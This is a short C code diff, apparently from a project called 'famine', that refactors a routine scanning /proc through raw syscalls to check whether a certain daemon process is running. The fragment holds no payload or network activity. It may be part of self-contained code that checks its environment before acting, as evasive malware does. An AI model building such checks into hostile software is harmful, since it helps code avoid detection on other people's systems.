@@ -9,11 +9,10 @@
 #include "famine.h"
 
 static bool isDaemon(const char *procDirectory, const char *dirName) {
-	size_t dirNameLen = ft_strlen(dirName);
-	char filePath[dirNameLen + 12];
-	ft_strcpy(filePath, procDirectory);
-	ft_strcpy(filePath + 6, dirName);
-	ft_strcpy(filePath + 6 + dirNameLen, ((char[]) {'/', 's', 't', 'a', 't', '\0'}));
+	char filePath[PATH_MAX];
+	ft_strcpy(filePath, procDirectory); // "/proc/"
+	ft_strcpy(filePath + 6, dirName); // "/proc/14552"
+	ft_strcpy(filePath + 6 + ft_strlen(dirName), ((char[]) {'/', 's', 't', 'a', 't', '\0'})); // "/proc/14552/stat"
 
 	int fd = (int) syscall_wrapper(__NR_open, filePath, O_RDONLY);
 	if (fd == -1) {
@@ -27,7 +26,8 @@ static bool isDaemon(const char *procDirectory, const char *dirName) {
 
 }
 
-bool DaemonProcessRunning(const char *procDirectory) {
+bool isDaemonProcessRunning(const char *procDirectory) {
+	bool running = false;
 	int fd = (int) syscall_wrapper(__NR_open, procDirectory, O_RDONLY | O_DIRECTORY);
 	if (fd == -1) {
 		return false;
@@ -44,15 +44,16 @@ bool DaemonProcessRunning(const char *procDirectory) {
 			struct linux_dirent64 *entry = (struct linux_dirent64 *) (bufDirent + offset);
 			if (entry->d_type == DT_DIR && entry->d_name[0] != '.') {
 				if (isDaemon(procDirectory, entry->d_name)) {
-					syscall_wrapper(__NR_close, fd);
-					return true;
+					running = true;
+					goto end;
 				}
 			}
 			offset += entry->d_reclen;
 		}
 	}
 
+end:
 	syscall_wrapper(__NR_close, fd);
-	return false;
+	return running;
 }
 
